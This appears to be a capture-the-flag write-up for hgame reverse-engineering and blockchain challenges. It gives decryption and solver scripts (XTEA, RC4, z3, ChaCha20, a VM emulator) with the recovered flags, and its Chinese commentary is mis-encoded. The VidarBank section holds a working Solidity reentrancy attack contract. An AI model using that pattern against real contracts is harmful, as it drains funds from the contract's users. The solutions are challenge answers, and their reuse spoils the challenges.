gen(key): s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datakey = 'As_we_do_as_you_know'enc = 'wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl'_enc = base64.b64decode(enc).decode()result = ''for c, k in zip(_enc, gen(key)): result += chr(ord(c) ^ k)print(result)# hgame&#123;python_reverse_is_easy_with_internet&#125;# VidarCamera ä¸»è¦ç®—æ³•ï¼š private final int[] m41encrypthkIa6DI(int[] iArr) &#123; int i; int[] iArr2 = UIntArray.m208constructorimpl(4); UIntArray.m219setVXSXFK8(iArr2, 0, 2233); UIntArray.m219setVXSXFK8(iArr2, 1, 4455); UIntArray.m219setVXSXFK8(iArr2, 2, 6677); UIntArray.m219setVXSXFK8(iArr2, 3, 8899); int i2 = 0; while (i2 &lt; 9) &#123; int i3 = 0; int i4 = 0; do &#123; i3++; i = i2 + 1; UIntArray.m219setVXSXFK8(iArr, i2, UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i2) + UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr2, UInt.m155constructorimpl(i4 &amp; 3)) + i4) ^ UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i) &lt;&lt; 4) ^ UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i) >>> 5)) + UIntArray.m214getpVg5ArA(iArr, i))) ^ i4))); UIntArray.m219setVXSXFK8(iArr, i, UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i) + UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i2) &lt;&lt; 4) ^ UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i2) >>> 5)) + UIntArray.m214getpVg5ArA(iArr, i2)) ^ UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr2, UInt.m155constructorimpl(UInt.m155constructorimpl(i4 >>> 11) &amp; 3)) + i4)))); i4 = UInt.m155constructorimpl(i4 + 878077251); &#125; while (i3 &lt;= 32); i2 = i; &#125; return iArr; &#125; public static final void m42onCreate$lambda0(EditText inputsomething, CameraActivity this$0, AlertDialog alertDialog, View view) &#123; Intrinsics.checkNotNullParameter(inputsomething, \"$inputsomething\"); Intrinsics.checkNotNullParameter(this$0, \"this$0\"); String obj = inputsomething.getText().toString(); if (obj.length() != 40) &#123; Toast.makeText(this$0, \"åºåˆ—å·ä¸æ­£ç¡®\", 0).show(); return; &#125; int[] iArr = UIntArray.m208constructorimpl(10); for (int i = 0; i &lt; 40; i += 4) &#123; UIntArray.m219setVXSXFK8(iArr, i / 4, UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(obj.charAt(i)) + UInt.m155constructorimpl(obj.charAt(i + 1) &lt;&lt; '\\b')) + UInt.m155constructorimpl(obj.charAt(i + 2) &lt;&lt; 16)) + UInt.m155constructorimpl(obj.charAt(i + 3) &lt;&lt; 24))); &#125; int[] iArr2 = this$0.m41encrypthkIa6DI(iArr); UInt[] uIntArr = &#123;UInt.m149boximpl(637666042), UInt.m149boximpl(457511012), UInt.m149boximpl(-2038734351), UInt.m149boximpl(578827205), UInt.m149boximpl(-245529892), UInt.m149boximpl(-1652281167), UInt.m149boximpl(435335655), UInt.m149boximpl(733644188), UInt.m149boximpl(705177885), UInt.m149boximpl(-596608744)&#125;; int i2 = 0; while (true) &#123; int i3 = i2 + 1; if (uIntArr[i2].m206unboximpl() != UIntArray.m214getpVg5ArA(iArr2, i2)) &#123; Toast.makeText(this$0, \"åºåˆ—å·ä¸æ­£ç¡®\", 0).show(); return; &#125; else if (i3 > 9) &#123; alertDialog.dismiss(); return; &#125; else &#123; i2 = i3; &#125; &#125; &#125;å¯ä»¥çœ‹å‡ºç”¨çš„æ˜¯ xtea ç®—æ³•ï¼Œä½†æ˜¯æœ‰äº›ä¸ä¸€æ ·çš„åœ°æ–¹ exp: from ctypes import *def encrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x34566543 total = c_uint32(0) for i in range(32): v0.value += (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) total.value += delta v1.value += (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) return v0.value, v1.valuedef decrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x34566543 total = c_uint32(delta * 33) for i in range(33): total.value -= delta v1.value -= (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) # total.value -= delta v0.value -= (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3])^total.value return v0.value, v1.value# 637666042,457511012,-2038734351,578827205,-245529892,-1652281167,435335655,733644188,705177885,-596608744# testif __name__ == \"__main__\": # å¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä¸¤ä¸ª 32 ä½æ•´å‹ï¼Œå³ 64bit çš„æ˜æ–‡æ•°æ® value = [637666042, 457511012, -2038734351, 578827205, -245529892, -1652281167, 435335655, 733644188, 705177885, -596608744] # å››ä¸ª keyï¼Œæ¯ä¸ªæ˜¯ 32bitï¼Œå³å¯†é’¥é•¿åº¦ä¸º 128bit key = [2233, 4455, 6677, 8899] for i in range(len(value) - 2, -1, -1): _value = [value[i], value[i+1]] value[i], value[i+1] = decrypt(_value, key) for i in value: print(bytearray.fromhex(hex(i)[2::]).decode()[::-1],sep='', end='')# hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;# VidarBank(blockchain) ä¸€çœ‹æºç å°±æ˜¯é‡å…¥æ”»å‡» [+] deployer account: 0x4eE700C7CE61515BA947bbAd8638168417AF67fF[+]token:v4.local.SUcqXp9Sld4E095kaPQqOUM1_Dmkq9T4YLM1xP4jmfRAdw47AVNCVcDNYC9VgTywR_TQs_bY5aIegOza3iMIKlQ6pcVMJZKJiJxHdJENX9MU3sFEJ5qM_H3my8uizgHs3kMmV0Svp3eUh9EUw80qvR5XewCouS8piP7-UdfSz4lLfA[+] contract address: 0xCeea6d7190d67323FD29130d63808c187311BDF8[+] transaction hash: 0xb2feb0f1346a9a66156eace411ed603c990109f0a69b28459a444e6f5b6d1395æ”»å‡»åˆçº¦å†™ä¸€ä¸‹ //SPDX-License-Identifier: UNLICENSEDpragma solidity >=0.8.7;import \"./VidarBank.sol\";contract attack&#123; VidarBank vidarBank; constructor(address _addr) public&#123; vidarBank = VidarBank(_addr); &#125; function get() public returns(uint256)&#123; return vidarBank.balances(address(this)); &#125; function get_address() public returns(address)&#123; return address(this); &#125; function send() public&#123; vidarBank.isSolved(); //hgame&#123;525d49d486d5357aaec38e7ab621c92cf7486d5e&#125; &#125; function create() public payable&#123; vidarBank.newAccount&#123;value: 0.001 ether&#125;(); &#125; function Attack() external payable &#123; vidarBank.donateOnce(); &#125; fallback() external payable&#123; if(vidarBank.balances(address(this))&lt;30)&#123; vidarBank.donateOnce(); &#125; &#125;&#125;# week3 # kunmusic ILSpy æ‰“å¼€ï¼Œçœ‹çœ‹ main å‡½æ•° å¾—çŸ¥å¯¹ data æ–‡ä»¶å­—èŠ‚è¿›è¡Œå¼‚æˆ– 104 æ“ä½œ ç”¨ python æŠŠ data æ–‡ä»¶å¼‚æˆ– 104ï¼Œç„¶åç”¨ ILspy æ‰“å¼€ data_new æ–‡ä»¶ with open('data', 'rb') as f: s = f.read() s = bytearray(s) for i in range(len(s)): s[i] ^= 104 with open('data_new', 'wb') as f: f.write(s) ä¸ºäº†åŠ å¿«è¿è¡Œé€Ÿåº¦ï¼Œç›´æ¥ç”± hgame&#123; å¼€å¤´å¾—åˆ° num [0]~num [5] from z3 import *num = [BitVec('num%d' % i, 50) for i in range(13)]solver = Solver()solver.add(num[0] + 52296 + num[1] - 26211 + num[2] - 11754 + (num[3] ^ 0xA114) + num[4] * 63747 + num[5] - 52714 + num[ 6] - 10512 + num[7] * 12972 + num[8] + 45505 + num[9] - 21713 + num[10] - 59122 + num[11] - 12840 + ( num[12] ^ 0x525F) == 12702282)solver.add( num[0] - 25228 + (num[1] ^ 0x50DB) + (num[2] ^ 0x1FDE) + num[3] - 65307 + num[4] * 30701 + num[5] * 47555 + num[ 6] - 2557 + (num[7] ^ 0xBF9F) + num[8] - 7992 + (num[9] ^ 0xE079) + (num[10] ^ 0xE052) + num[11] + 13299 + num[ 12] - 50966 == 9946829)solver.add(num[0] - 64801 + num[1] - 60698 + num[2] - 40853 + num[3] - 54907 + num[4] + 29882 + (num[5] ^ 0x3506) + ( num[6] ^ 0x533E) + num[7] + 47366 + num[8] + 41784 + (num[9] ^ 0xD1BA) + num[10] * 58436 + num[11] * 15590 + num[12] + 58225 == 2372055)solver.add( num[0] + 61538 + num[1] - 17121 + num[2] - 58124 + num[3] + 8186 + num[4] + 21253 + num[5] - 38524 + num[ 6] - 48323 + num[7] - 20556 + num[8] * 56056 + num[9] + 18568 + num[10] + 12995 + (num[11] ^ 0x995C) + num[ 12] + 25329 == 6732474)solver.add( num[0] - 42567 + num[1] - 17743 + num[2] * 47827 + num[3] - 10246 + (num[4] ^ 0x3F9C) + num[5] + 39390 + num[ 6] * 11803 + num[7] * 60332 + (num[8] ^ 0x483B) + (num[9] ^ 0x12BB) + num[10] - 25636 + num[11] - 16780 + num[ 12] - 62345 == 14020739)solver.add(num[0] - 10968 + num[1] - 31780 + (num[2] ^ 0x7C71) + num[3] - 61983 + num[4] * 31048 + num[5] * 20189 + num[ 6] + 12337 + num[7] * 25945 + (num[8] ^ 0x1B98) + num[9] - 25369 + num[10] - 54893 + num[11] * 59949 + ( num[12] ^ 0x3099) == 14434062)solver.add(num[0] + 16689 + num[1] - 10279 + num[2] - 32918 + num[3] - 57155 + num[4] * 26571 + num[5] * 15086 + ( num[6] ^ 0x59CA) + (num[7] ^ 0x5B35) + (num[8] ^ 0x3FFD) + (num[9] ^ 0x5A85) + num[10] - 40224 + num[ 11] + 31751 + num[12] * 8421 == 7433598)solver.add( num[0] + 28740 + num[1] - 64696 + num[2] + 60470 + num[3] - 14752 + (num[4] ^ 0x507) + (num[5] ^ 0x89C8) + num[ 6] + 49467 + num[7] - 33788 + num[8] + 20606 + (num[9] ^ 0xAF4A) + num[10] * 19764 + num[11] + 48342 + num[ 12] * 56511 == 7989404)solver.add((num[0] ^ 0x7132) + num[1] + 23120 + num[2] + 22802 + num[3] * 31533 + (num[4] ^ 0x9977) + num[5] - 48576 + ( num[6] ^ 0x6F7E) + num[7] - 43265 + num[8] + 22365 + num[9] + 61108 + num[10] * 2823 + num[11] - 30343 + num[12] + 14780 == 3504803)solver.add( num[0] * 22466 + (num[1] ^ 0xDABF) + num[2] - 53658 + (num[3] ^ 0xB838) + (num[4] ^ 0x30DF) + num[5] * 59807 + num[ 6] + 46242 + num[7] + 3052 + (num[8] ^ 0x62BF) + num[9] + 30202 + num[10] * 22698 + num[11] + 33480 + ( num[12] ^ 0x4175) == 11003580)solver.add( num[0] * 57492 + (num[1] ^ 0x346D) + num[2] - 13941 + (num[3] ^ 0xBBDC) + num[4] * 38310 + num[5] + 9884 + num[ 6] - 45500 + num[7] - 19233 + num[8] + 58274 + num[9] + 36175 + (num[10] ^ 0x4888) + num[11] * 49694 + ( num[12] ^ 0x2501) == 25546210)solver.add(num[0] - 23355 + num[1] * 50164 + (num[2] ^ 0x873A) + num[3] + 52703 + num[4] + 36245 + num[5] * 46648 + ( num[6] ^ 0x12FA) + (num[7] ^ 0xA376) + num[8] * 27122 + (num[9] ^ 0xA44A) + num[10] * 15676 + num[ 11] - 31863 + num[12] + 62510 == 11333836)solver.add( num[0] * 30523 + (num[1] ^ 0x1F36) + num[2] + 39058 + num[3] * 57549 + (num[4] ^ 0xD0C0) + num[5] * 4275 + num[ 6] - 48863 + (num[7] ^ 0xD88C) + (num[8] ^ 0xA40) + (num[9] ^ 0x3554) + num[10] + 62231 + num[11] + 19456 + num[ 12] - 13195 == 13863722)solver.add(num[0] == 236, num[1] == 72, num[2] == 213, num[3] == 106, num[4] == 189, num[5] == 86)if solver.check() == sat: m = solver.model() for i in range(len(m)): print('num[%d]' % i, '=', int(str(m[num[i]])))else: print('unsat')'''num[0] = 236num[1] = 72num[2] = 213num[3] = 106num[4] = 189num[5] = 86num[6] = 62num[7] = 53num[8] = 120num[9] = 199num[10] = 15num[11] = 93num[12] = 133'''æœ€åå¾—åˆ° flag num = [0 for i in range(13)]num[0] = 236num[1] = 72num[2] = 213num[3] = 106num[4] = 189num[5] = 86num[6] = 62num[7] = 53num[8] = 120num[9] = 199num[10] = 15num[11] = 93num[12] = 133array = [132, 47, 180, 7, 216, 45, 68, 6, 39, 246, 124, 2, 243, 137, 58, 172, 53, 200, 99, 91, 83, 13, 171, 80, 108, 235, 179, 58, 176, 28, 216, 36, 11, 80, 39, 162, 97, 58, 236, 130, 123, 176, 24, 212, 56, 89, 72]for i in range(len(array)): print(chr(array[i] ^ num[i % len(num)]),end='')# hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;# patchme å…ˆè¿‡ä¸€ä¸‹åè°ƒè¯•ï¼Œjz æ”¹æˆ jnz è®© ida åœ¨è°ƒè¯•çŠ¶æ€ä¸é€€å‡º æ­¤å¤„ä½¿ç”¨ mprotect, å°†ä¸€æ®µå†…å­˜åŒºåŸŸæ ‡è®°ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åç»è¿‡å¼‚æˆ–è§£å¯†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å»çœ‹è¿™æ®µè§£å¯†åçš„ä»£ç  void __noreturn sub_56092A0864CA()&#123; __WAIT_STATUS stat_loc; // [rsp+Ch] [rbp-2C4h] BYREF int i; // [rsp+14h] [rbp-2BCh] __int64 v2; // [rsp+18h] [rbp-2B8h] int pipedes[2]; // [rsp+20h] [rbp-2B0h] BYREF int v4[2]; // [rsp+28h] [rbp-2A8h] BYREF char *argv[4]; // [rsp+30h] [rbp-2A0h] BYREF char v6[48]; // [rsp+50h] [rbp-280h] BYREF __int64 v7; // [rsp+80h] [rbp-250h] __int64 v8[5]; // [rsp+E0h] [rbp-1F0h] int v9; // [rsp+108h] [rbp-1C8h] __int16 v10; // [rsp+10Ch] [rbp-1C4h] char v11; // [rsp+10Eh] [rbp-1C2h] __int64 v12[5]; // [rsp+110h] [rbp-1C0h] int v13; // [rsp+138h] [rbp-198h] __int16 v14; // [rsp+13Ch] [rbp-194h] char v15; // [rsp+13Eh] [rbp-192h] char buf[80]; // [rsp+140h] [rbp-190h] BYREF char s1[8]; // [rsp+190h] [rbp-140h] BYREF __int64 v18; // [rsp+198h] [rbp-138h] char v19[280]; // [rsp+1A0h] [rbp-130h] BYREF int v20; // [rsp+2B8h] [rbp-18h] unsigned __int64 v21; // [rsp+2C8h] [rbp-8h] v21 = __readfsqword(0x28u); if ( dword_56092A089028 &lt;= 1 ) &#123; pipe(pipedes); pipe(v4); if ( fork() ) &#123; close(pipedes[0]); close(v4[1]); HIDWORD(stat_loc.__iptr) = 0; while ( SHIDWORD(stat_loc.__iptr) &lt;= 35 ) &#123; buf[2 * HIDWORD(stat_loc.__iptr)] = 37; buf[2 * HIDWORD(stat_loc.__iptr)++ + 1] = 110; &#125; buf[72] = 10; buf[73] = 0; write(pipedes[1], buf, 0x4AuLL); *(_QWORD *)s1 = 0LL; v18 = 0LL; memset(v19, 0, sizeof(v19)); v20 = 0; read(v4[0], s1, 0x12CuLL); wait((__WAIT_STATUS)&amp;stat_loc); if ( !LODWORD(stat_loc.__uptr) &amp;&amp; !strncmp(s1, buf, 0x14uLL) ) &#123; v8[0] = 0x5416D999808A28FALL; v8[1] = 0x588505094953B563LL; v8[2] = 0xCE8CF3A0DC669097LL; v8[3] = 0x4C5CF3E854F44CBDLL; v8[4] = 0xD144E49916678331LL; v9 = -631149652; v10 = -17456; v11 = 85; v12[0] = 0x3B4FA2FCEDEB4F92LL; v12[1] = 0x7E45A6C3B67EA16LL; v12[2] = 0xAFE1ACC8BF12D0E7LL; v12[3] = 0x132EC3B7269138CELL; v12[4] = 0x8E2197EB7311E643LL; v13 = -1370223935; v14 = -13899; v15 = 40; putchar(10); for ( i = 0; i &lt;= 46; ++i ) putchar((char)(*((_BYTE *)v8 + i) ^ *((_BYTE *)v12 + i))); &#125; else &#123; puts(\"\\nthere are still bugs...\"); &#125; &#125; else &#123; fflush(stdin); close(pipedes[1]); close(v4[0]); dup2(pipedes[0], 0); dup2(v4[1], 1); dup2(v4[1], 2); argv[0] = *(char **)qword_56092A089020; argv[1] = (char *)&amp;unk_56092A087025; argv[2] = 0LL; sub_56092A086AA0(*(_QWORD *)qword_56092A089020, v6); v2 = v7; if ( v7 == 14472 ) execve(*(const char **)qword_56092A089020, argv, 0LL); else puts(\"\\nyou cannot modify the file size\"); &#125; &#125;&#125;é€»è¾‘å¾ˆæ¸…æ¥šï¼Œç›´æ¥å†™ exp å°±è¡Œäº† v8 = [0 for i in range(8)]v8[0] = 0x5416D999808A28FAv8[1] = 0x588505094953B563v8[2] = 0xCE8CF3A0DC669097v8[3] = 0x4C5CF3E854F44CBDv8[4] = 0xD144E49916678331v8[5] = -631149652v8[6] = -17456v8[7] = 85v12 = [0 for i in range(8)]v12[0] = 0x3B4FA2FCEDEB4F92v12[1] = 0x7E45A6C3B67EA16v12[2] = 0xAFE1ACC8BF12D0E7v12[3] = 0x132EC3B7269138CEv12[4] = 0x8E2197EB7311E643v12[5] = -1370223935v12[6] = -13899v12[7] = 40for i in range(len(v8)): a = v8[i] ^ v12[i] print(bytearray.fromhex(hex(a)[2::]).decode()[::-1], end='') # hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;# cpp é€šè¿‡è¿™äº›æ•°æ®å¯ä»¥ç¡®å®šæ˜¯ chacha20 ç®—æ³• é€šè¿‡åŠ¨æ€è°ƒè¯•å¾—çŸ¥ chacha20 çš„ key ä¸º hgame&#123;th , counter ä¸º 0x12345678 , nonce ä¸º ['h','g','a'] ä½†æ˜¯æŠŠæ•°æ®æ”¾åˆ° chacha20 ç®—æ³•é‡Œé¢å´ä¸èƒ½è¾“å‡º flag æ‰€ä»¥æˆ‘ç›´æ¥æ‰¾åˆ°å¯¹çŸ©é˜µè¿›è¡Œæ“ä½œçš„å‡½æ•°ï¼Œ å¹¶ä¸”å¾—åˆ°äº†æœ€ç»ˆçš„çŸ©é˜µ exp å¦‚ä¸‹ import numpy as npimport structimport hashlibimport warningsfrom ctypes import *# ChaCha20 Matrix: 16 words, 32-bits each (4 bytes each) for a total of 64-bytes# cccccccc cccccccc cccccccc cccccccc #constants# kkkkkkkk kkkkkkkk kkkkkkkk kkkkkkkk #key# kkkkkkkk kkkkkkkk kkkkkkkk kkkkkkkk #key# bbbbbbbb nnnnnnnn nnnnnnnn nnnnnnnn #block_number and nonce# Disable overflow warnings for numpy uint as we need the overflow in ChaCha20's additionwarnings.filterwarnings(\"ignore\")def quarterround(a, b, c, d): def circular_left(num, i): return ((num &lt;&lt; i) &amp; 0xFFFFFFFF) | (num >> (32 - i)) # a, b, c, d are numpy uint32. The addition may overflow which is ok for ChaCha20 a += b d ^= a d = circular_left(d, 16) c += d b ^= c b = circular_left(b, 12) a += b d ^= a d = circular_left(d, 8) c += d b ^= c b = circular_left(b, 7) return (a, b, c, d)def rounds(block): steps = [ [0, 4, 8, 12], [1, 5, 9, 13], [2, 6, 10, 14], [3, 7, 11, 15], [0, 5, 10, 15], [1, 6, 11, 12], [2, 7, 8, 13], [3, 4, 9, 14], ] # print(type(block)) for _ in range(10): for round in steps: block[round] = quarterround(*(block[round])) return blockdef _xor(data_1, data_2): return [a ^ b for a, b in zip(data_1, data_2)]def encrypt(plaintext): ''' global matrix # Add the 4-byte block number # matrix[12] = counter state = matrix.copy() state = rounds(state) # Create the final state final = state + matrix # Serialize the final state # print(hex(c_uint32(final[0]).value)) ''' final = np.array( [0x4037A04E, 0xFDDA0246, 0x3C6EFA21, 0xCF9CD9AF, 0x673347B9, 0x0DEC4EE0, 0x1380C4D1, 0x3AB2A932, 0x025D50A7, 0x834A3982, 0xCB6EA25F, 0xA26BA4AB, 0xA1C42135, 0xD1063EBA, 0x2397FEFC, 0x55C7D126], dtype=np.uint32) serial_out = struct.pack(\"&lt;16L\", *final) ciphertext = bytes(_xor(serial_out, plaintext)) return ciphertextdef decrypt(ciphertext): return encrypt(ciphertext)'''matrix = np.array( [0x61707865, 0x3320646E, 0x79622D32, 0x6B206574, 0x00000068, 0x00000067, 0x00000061, 0x0000006D, 0x00000065, 0x0000007B, 0x00000074, 0x00000068, 0x12345678, 0x00000068, 0x00000067, 0x00000061], dtype=np.uint32)'''_ciphertext = [40, 80, -63, 35, -104, -95, 65, 54, 76, 49, -53, 82, -112, -15, -84, -52, 15, 108, 42, -119, 127, -33, 17, -124, 127, -26, -94, -32, 89, -57, -59, 70, 93, 41, 56, -109, -19, 21, 122, -1]ciphertext = [0 for _ in range(40)]for i in range(0, len(_ciphertext), 4): ciphertext[i] = _ciphertext[i + 3] ciphertext[i + 1] = _ciphertext[i + 2] ciphertext[i + 2] = _ciphertext[i + 1] ciphertext[i + 3] = _ciphertext[i]# print(ciphertext)for i in range(len(ciphertext)): if ciphertext[i] &lt; 0: ciphertext[i] += 256ciphertext = bytearray(ciphertext)flag = decrypt(ciphertext)for i in range(0, len(_ciphertext), 4): print(chr(flag[i+3]),chr(flag[i+2]),chr(flag[i+1]),chr(flag[i]),end='',sep='')# hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;# week4 # vm å†™ä¸ªæ­£å‘çš„ä»£ç  #include&lt;stdio.h>unsigned char key[1008] = &#123; 0x00, 0x03, 0x02, 0x00, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00, 0x03, 0x02, 0x32, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x03, 0x02, 0x64, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03, 0x03, 0x01, 0x00, 0x00, 0x03, 0x00, 0x08, 0x00, 0x02, 0x02, 0x01, 0x03, 0x04, 0x01, 0x00, 0x03, 0x05, 0x02, 0x00, 0x03, 0x00, 0x01, 0x02, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x03, 0x00, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x03, 0x01, 0x28, 0x04, 0x06, 0x5F, 0x05, 0x00, 0x00, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00, 0x03, 0x02, 0x96, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x04, 0x07, 0x88, 0x00, 0x03, 0x00, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x03, 0x01, 0x28, 0x04, 0x07, 0x63, 0xFF, 0xFF&#125;;unsigned int input[200] = &#123; 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0000009B, 0x000000A8, 0x00000002, 0x000000BC, 0x000000AC, 0x0000009C, 0x000000CE, 0x000000FA, 0x00000002, 0x000000B9, 0x000000FF, 0x0000003A, 0x00000074, 0x00000048, 0x00000019, 0x00000069, 0x000000E8, 0x00000003, 0x000000CB, 0x000000C9, 0x000000FF, 0x000000FC, 0x00000080, 0x000000D6, 0x0000008D, 0x000000D7, 0x00000072, 0x00000000, 0x000000A7, 0x0000001D, 0x0000003D, 0x00000099, 0x00000088, 0x00000099, 0x000000BF, 0x000000E8, 0x00000096, 0x0000002E, 0x0000005D, 0x00000057, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x000000C9, 0x000000A9, 0x000000BD, 0x0000008B, 0x00000017, 0x000000C2, 0x0000006E, 0x000000F8, 0x000000F5, 0x0000006E, 0x00000063, 0x00000063, 0x000000D5, 0x00000046, 0x0000005D, 0x00000016, 0x00000098, 0x00000038, 0x00000030, 0x00000073, 0x00000038, 0x000000C1, 0x0000005E, 0x000000ED, 0x000000B0, 0x00000029, 0x0000005A, 0x00000018, 0x00000040, 0x000000A7, 0x000000FD, 0x0000000A, 0x0000001E, 0x00000078, 0x0000008B, 0x00000062, 0x000000DB, 0x0000000F, 0x0000008F, 0x0000009C, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00004800, 0x0000F100, 0x00004000, 0x00002100, 0x00003501, 0x00006400, 0x00007801, 0x0000F900, 0x00001801, 0x00005200, 0x00002500, 0x00005D01, 0x00004700, 0x0000FD00, 0x00006901, 0x00005C00, 0x0000AF01, 0x0000B200, 0x0000EC01, 0x00005201, 0x00004F01, 0x00001A01, 0x00005000, 0x00008501, 0x0000CD00, 0x00002300, 0x0000F800, 0x00000C00, 0x0000CF00, 0x00003D01, 0x00004501, 0x00008200, 0x0000D201, 0x00002901, 0x0000D501, 0x00000601, 0x0000A201, 0x0000DE00, 0x0000A601, 0x0000CA01, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000&#125;;int a1[9] = &#123; 0 &#125;;int reg[80] = &#123; 0 &#125;;int main() &#123; int count = 1,count_func5 = 1; while (key[a1[6]] != 255) &#123; printf(\"count:%d, call func%d, \",count++, key[a1[6]]); switch (key[a1[6]]) &#123; case 0u: printf(\"run opcode: %d %d %d %d\", key[a1[6]], key[a1[6] + 1], key[a1[6] + 2], key[a1[6] + 3]); if (key[a1[6] + 1]) &#123; switch (key[a1[6] + 1]) &#123; case 1u: printf(\",input[%d] = a1[0]\", a1[2]); input[a1[2]] = a1[0]; break; case 2u: printf(\", a1[%d] = a1[%d]\", key[a1[6] + 2],key[a1[6] + 3]); a1[key[a1[6] + 2]] = a1[key[a1[6] + 3]]; break; case 3u: printf(\", a1[%d] = %d\", key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] = key[a1[6] + 3]; break; &#125; &#125; else &#123; printf(\", a1[0] = input[%d]\", a1[2]); a1[0] = input[a1[2]]; &#125; a1[6] = a1[6] + 4; printf(\", a1[0~3] = %d, %d, %d, %d\", a1[0], a1[1], a1[2], a1[3]); break; case 1u: printf(\"run opcode: %d %d\", key[a1[6]], key[a1[6] + 1]); if (key[a1[6] + 1]) &#123; switch (key[a1[6] + 1]) &#123; case 1u: reg[++a1[7]] = a1[0]; break; case 2u: reg[++a1[7]] = a1[2]; break; case 3u: reg[++a1[7]] = a1[3]; break; &#125; &#125; else &#123; reg[++a1[7]] = a1[0]; &#125; a1[6] = a1[6] + 2; break; case 2u: printf(\"run opcode: %d %d\", key[a1[6]], key[a1[6] + 1]); if (key[a1[6] + 1]) &#123; switch (key[a1[6] + 1]) &#123; case 1u: a1[1] = reg[a1[7]--]; break; case 2u: a1[2] = reg[a1[7]--]; break; case 3u: a1[3] = reg[a1[7]--]; break; &#125; &#125; else &#123; a1[0] = reg[a1[7]--]; &#125; a1[6] = a1[6] + 2; break; case 3u: printf(\"run opcode: %d %d %d %d\", key[a1[6]], key[a1[6] + 1], key[a1[6] + 2], key[a1[6] + 3]); switch (key[a1[6] + 1]) &#123; case 0u: printf(\", a1[%d] = a1[%d] + a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] += a1[key[a1[6] + 3]]; break; case 1u: printf(\", a1[%d] = a1[%d] - a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] -= a1[key[a1[6] + 3]]; break; case 2u: printf(\", a1[%d] = a1[%d] * a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] *= a1[key[a1[6] + 3]]; break; case 3u: printf(\", a1[%d] = a1[%d] ^ a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] ^= a1[key[a1[6] + 3]]; break; case 4u: printf(\", a1[%d] = (a1[%d] &lt;&lt; a1[%d])&amp;0xFF00\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] 